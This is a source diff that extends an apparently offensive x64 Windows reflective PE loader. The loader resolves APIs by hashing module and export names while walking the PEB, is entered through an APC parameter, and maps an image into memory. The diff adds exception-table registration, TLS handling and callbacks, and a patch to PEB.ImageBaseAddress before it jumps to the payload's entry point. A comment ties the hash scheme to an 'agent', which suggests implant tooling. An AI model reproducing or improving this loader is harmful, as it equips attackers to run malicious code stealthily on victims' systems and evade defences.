@@ -55,8 +55,11 @@ typedef long                NTSTATUS;
 
 #define IMAGE_DIRECTORY_ENTRY_EXPORT    0
 #define IMAGE_DIRECTORY_ENTRY_IMPORT    1
+#define IMAGE_DIRECTORY_ENTRY_EXCEPTION 3
 #define IMAGE_DIRECTORY_ENTRY_BASERELOC 5
 #define IMAGE_DIRECTORY_ENTRY_TLS       9
+
+#define DLL_PROCESS_ATTACH 1
 
 #define IMAGE_REL_BASED_ABSOLUTE 0
 #define IMAGE_REL_BASED_HIGH     1
@@ -170,6 +173,25 @@ typedef struct {
     DWORD SizeOfBlock;
 } RL_BASE_RELOCATION;
 
+/* ─── TLS structures ─── */
+typedef struct {
+    QWORD StartAddressOfRawData;
+    QWORD EndAddressOfRawData;
+    QWORD AddressOfIndex;        /* DWORD* — receives TLS index */
+    QWORD AddressOfCallBacks;    /* PIMAGE_TLS_CALLBACK* — null-terminated array */
+    DWORD SizeOfZeroFill;
+    DWORD Characteristics;
+} RL_TLS_DIRECTORY64;
+
+typedef void (__attribute__((ms_abi)) *RL_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved);
+
+/* ─── Exception handling (.pdata) ─── */
+typedef struct {
+    DWORD BeginAddress;
+    DWORD EndAddress;
+    DWORD UnwindInfoAddress;
+} RL_RUNTIME_FUNCTION;
+
 /* ─── PEB structures ─── */
 typedef struct _RL_UNICODE_STRING {
     WORD  Length;
@@ -189,13 +211,16 @@ typedef BOOL   (__attribute__((ms_abi)) *fn_VirtualProtect)(PVOID, SIZE_T, DWORD
 typedef PVOID  (__attribute__((ms_abi)) *fn_LoadLibraryA)(const char *);
 typedef PVOID  (__attribute__((ms_abi)) *fn_GetProcAddress)(PVOID, const char *);
 typedef BOOL   (__attribute__((ms_abi)) *fn_FlushIC)(HANDLE, PVOID, SIZE_T);
+typedef DWORD  (__attribute__((ms_abi)) *fn_TlsAlloc)(void);
+typedef BOOL   (__attribute__((ms_abi)) *fn_TlsSetValue)(DWORD, PVOID);
+typedef BYTE   (__attribute__((ms_abi)) *fn_RtlAddFunctionTable)(RL_RUNTIME_FUNCTION *, DWORD, QWORD);
 typedef void   (__attribute__((ms_abi)) *fn_Entry)(void);
 
 /* ═══════════════════════════════════════════════════════════════════
  *  DJB2 hash — matches the agent's api_hash() for consistency
  * ═══════════════════════════════════════════════════════════════════ */
 
-static __attribute__((always_inline)) DWORD _rl_hash(const char *s) {
+static inline __attribute__((always_inline)) DWORD _rl_hash(const char *s) {
     DWORD h = 5381;
     while (*s) {
         h = ((h << 5) + h) + (BYTE)*s;
@@ -204,7 +229,7 @@ static __attribute__((always_inline)) DWORD _rl_hash(const char *s) {
     return h;
 }
 
-static __attribute__((always_inline)) DWORD _rl_hash_w_ci(const WORD *s, WORD lenBytes) {
+static inline __attribute__((always_inline)) DWORD _rl_hash_w_ci(const WORD *s, WORD lenBytes) {
     DWORD h = 5381;
     WORD n = lenBytes / 2;
     for (WORD i = 0; i < n; i++) {
@@ -222,18 +247,24 @@ static __attribute__((always_inline)) DWORD _rl_hash_w_ci(const WORD *s, WORD le
 #define RL_H_LOADLIBRARYA       0x5FBFF0FBu
 #define RL_H_GETPROCADDRESS     0xCF31BB1Fu
 #define RL_H_FLUSHINSTRUCTIONCACHE 0xB7DCEDDDu
+#define RL_H_TLSALLOC              0x8BF55163u
+#define RL_H_TLSSETVALUE           0xC324EBA1u
+
+/* ntdll.dll — for RtlAddFunctionTable (forwarded from kernel32, so resolve directly) */
+#define RL_H_NTDLL                 0x22D3B5EDu
+#define RL_H_RTLADDFUNCTIONTABLE   0xBDB9F1AEu
 
 /* ═══════════════════════════════════════════════════════════════════
  *  PEB walk → find module by hash → resolve export by hash
  * ═══════════════════════════════════════════════════════════════════ */
 
-static __attribute__((always_inline)) PVOID _rl_get_peb(void) {
+static inline __attribute__((always_inline)) PVOID _rl_get_peb(void) {
     PVOID peb;
     __asm__ __volatile__("mov %%gs:0x60, %0" : "=r"(peb));
     return peb;
 }
 
-static __attribute__((always_inline)) PVOID _rl_resolve_export(
+static inline __attribute__((always_inline)) PVOID _rl_resolve_export(
         BYTE *base, DWORD funcHash) {
     RL_DOS_HEADER *dos = (RL_DOS_HEADER *)base;
     if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
@@ -265,7 +296,7 @@ static __attribute__((always_inline)) PVOID _rl_resolve_export(
     return NULL;
 }
 
-static __attribute__((always_inline)) PVOID _rl_find_module(DWORD modHash) {
+static inline __attribute__((always_inline)) PVOID _rl_find_module(DWORD modHash) {
     BYTE *peb = (BYTE *)_rl_get_peb();
     if (!peb) return NULL;
 
@@ -299,7 +330,7 @@ static __attribute__((always_inline)) PVOID _rl_find_module(DWORD modHash) {
     return NULL;
 }
 
-static __attribute__((always_inline)) PVOID _rl_resolve(
+static inline __attribute__((always_inline)) PVOID _rl_resolve(
         DWORD modHash, DWORD funcHash) {
     PVOID mod = _rl_find_module(modHash);
     if (!mod) return NULL;
@@ -310,13 +341,13 @@ static __attribute__((always_inline)) PVOID _rl_resolve(
  *  Inline memcpy/memset (no libc)
  * ═══════════════════════════════════════════════════════════════════ */
 
-static __attribute__((always_inline)) void _rl_memcpy(void *dst, const void *src, SIZE_T n) {
+static inline __attribute__((always_inline)) void _rl_memcpy(void *dst, const void *src, SIZE_T n) {
     BYTE *d = (BYTE *)dst;
     const BYTE *s = (const BYTE *)src;
     while (n--) *d++ = *s++;
 }
 
-static __attribute__((always_inline)) void _rl_memset(void *dst, BYTE val, SIZE_T n) {
+static inline __attribute__((always_inline)) void _rl_memset(void *dst, BYTE val, SIZE_T n) {
     BYTE *d = (BYTE *)dst;
     while (n--) *d++ = val;
 }
@@ -325,7 +356,7 @@ static __attribute__((always_inline)) void _rl_memset(void *dst, BYTE val, SIZE_
  *  Section protection mapping
  * ═══════════════════════════════════════════════════════════════════ */
 
-static __attribute__((always_inline)) DWORD _rl_section_prot(DWORD chars) {
+static inline __attribute__((always_inline)) DWORD _rl_section_prot(DWORD chars) {
     BOOL x = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
     BOOL w = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
     BOOL r = (chars & IMAGE_SCN_MEM_READ)    != 0;
@@ -373,6 +404,10 @@ void reflective_loader_entry(QWORD apc_param) {
     fn_LoadLibraryA   pLoadLibraryA   = (fn_LoadLibraryA)  _rl_resolve(RL_H_KERNEL32, RL_H_LOADLIBRARYA);
     fn_GetProcAddress pGetProcAddress = (fn_GetProcAddress)_rl_resolve(RL_H_KERNEL32, RL_H_GETPROCADDRESS);
     fn_FlushIC        pFlushIC        = (fn_FlushIC)       _rl_resolve(RL_H_KERNEL32, RL_H_FLUSHINSTRUCTIONCACHE);
+    fn_TlsAlloc       pTlsAlloc       = (fn_TlsAlloc)     _rl_resolve(RL_H_KERNEL32, RL_H_TLSALLOC);
+    fn_TlsSetValue    pTlsSetValue    = (fn_TlsSetValue)  _rl_resolve(RL_H_KERNEL32, RL_H_TLSSETVALUE);
+    /* RtlAddFunctionTable is forwarded in kernel32 → resolve from ntdll directly */
+    fn_RtlAddFunctionTable pRtlAddFT = (fn_RtlAddFunctionTable)_rl_resolve(RL_H_NTDLL, RL_H_RTLADDFUNCTIONTABLE);
 
     if (!pVirtualAlloc || !pLoadLibraryA || !pGetProcAddress) return;
 
@@ -503,12 +538,72 @@ void reflective_loader_entry(QWORD apc_param) {
         }
     }
 
-    /* ── 9. Flush instruction cache ── */
+    /* ── 9. Register exception handlers (.pdata) ── */
+    {
+        RL_DATA_DIRECTORY *excDir =
+            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
+        if (excDir->VirtualAddress && excDir->Size && pRtlAddFT) {
+            RL_RUNTIME_FUNCTION *pFunc =
+                (RL_RUNTIME_FUNCTION *)(imageBase + excDir->VirtualAddress);
+            DWORD numEntries = excDir->Size / sizeof(RL_RUNTIME_FUNCTION);
+            pRtlAddFT(pFunc, numEntries, (QWORD)imageBase);
+        }
+    }
+
+    /* ── 10. Process TLS directory ── */
+    {
+        RL_DATA_DIRECTORY *tlsDir =
+            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
+        if (tlsDir->VirtualAddress && tlsDir->Size) {
+            RL_TLS_DIRECTORY64 *tls =
+                (RL_TLS_DIRECTORY64 *)(imageBase + tlsDir->VirtualAddress);
+
+            /* Allocate a TLS slot and store initial data */
+            if (pTlsAlloc && pTlsSetValue && tls->AddressOfIndex) {
+                DWORD tlsIndex = pTlsAlloc();
+                *(DWORD *)(tls->AddressOfIndex) = tlsIndex;
+
+                if (tls->StartAddressOfRawData && tls->EndAddressOfRawData) {
+                    SIZE_T dataSize =
+                        (SIZE_T)(tls->EndAddressOfRawData - tls->StartAddressOfRawData);
+                    if (dataSize > 0) {
+                        PVOID tlsData = pVirtualAlloc(
+                            NULL, dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                        if (tlsData) {
+                            _rl_memcpy(tlsData, (void *)tls->StartAddressOfRawData, dataSize);
+                            pTlsSetValue(tlsIndex, tlsData);
+                        }
+                    }
+                }
+            }
+
+            /* Call TLS callbacks */
+            if (tls->AddressOfCallBacks) {
+                RL_TLS_CALLBACK *callbacks = (RL_TLS_CALLBACK *)(tls->AddressOfCallBacks);
+                while (*callbacks) {
+                    (*callbacks)((PVOID)imageBase, DLL_PROCESS_ATTACH, NULL);
+                    callbacks++;
+                }
+            }
+        }
+    }
+
+    /* ── 11. Patch PEB.ImageBaseAddress ── */
+    {
+        /* TEB is at gs:0x30, PEB pointer is at TEB+0x60 (x64) */
+        BYTE *teb;
+        __asm__ __volatile__("mov %%gs:0x30, %0" : "=r"(teb));
+        BYTE *peb = *(BYTE **)(teb + 0x60);
+        /* PEB.ImageBaseAddress is at offset 0x10 (x64) */
+        *(PVOID *)(peb + 0x10) = (PVOID)imageBase;
+    }
+
+    /* ── 12. Flush instruction cache ── */
     if (pFlushIC) {
         pFlushIC((HANDLE)-1, imageBase, sizeOfImage);
     }
 
-    /* ── 10. Call PE entry point ── */
+    /* ── 13. Call PE entry point ── */
     fn_Entry entry = (fn_Entry)(imageBase + entryRVA);
     entry();
 
